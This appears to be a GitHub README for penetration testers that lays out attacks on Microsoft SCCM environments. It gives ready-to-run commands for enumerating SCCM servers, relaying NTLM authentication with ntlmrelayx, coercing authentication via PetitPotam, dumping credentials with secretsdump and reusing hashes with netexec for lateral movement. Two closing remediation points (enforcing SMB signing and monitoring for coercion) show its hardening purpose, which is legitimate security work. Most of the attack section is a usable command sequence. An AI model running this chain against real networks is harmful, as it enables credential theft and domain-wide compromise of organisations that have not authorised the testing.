# SCCM-Attacks
Common attacks against SCCM environments for legal offensive security personnel to harden environments.   
I learned these attacks through the amazing public research from [SpecterOps](https://github.com/subat0mik/Misconfiguration-Manager) and [Synacktiv](https://www.synacktiv.com/publications/sccmsecretspy-exploiting-sccm-policies-distribution-for-credentials-harvesting-initial), and I have performed them against several different organizations when I was a consultant.



## Enumerate SCCM Environment
**Requires [SCCMHunter](https://github.com/garrettfoster13/sccmhunter/wiki)**

1. Enumerate possible SCCM machines  
```python3 sccmhunter.py find -u <user> -p <password> -d <domain> -dc-ip <dc-ip>```
2. Gather SCCM roles and check configs such as SMB signing  
```python3 sccmhunter.py smb -u <user> -p <password> -d <domain> -dc-ip <dc-ip> ```
3. Display results  
```python3 sccmhunter.py show -all ```

## SMB Relaying 

**Requires any domain credentials and an SCCM server with SMB signing false**

### Steps:
1. Start ntlmrelayx targeting an SCCM server with SMB signing set to false  
```python3 ntlmrelayx.py -t "<TARGET IP>" -smb2support –socks```
2. Coerce authentication from an SCCM server to your IP  
```python3 petiPotam.py -u <user> -p <password> <your-ip> <target-ip>```
3. Confirm Admin status and dump credentials through proxychains  
```Proxychains impacket-secretsdump <domain>/<user>@<target-ip> -no-pass```
4. Authenticate to other SCCM servers that have SMB signing set to true  
```netexec smb <ip> -u <user> -H :<hash> --shares```

### Remediations:
- Enforce SMB signing on all SCCM servers (such as through group policy).
- Monitor for common coerce tools such as PetitPotam using default requests ([Splunk example](https://research.splunk.com/endpoint/95b8061a-0a67-11ec-85ec-acde48001122/)]

  
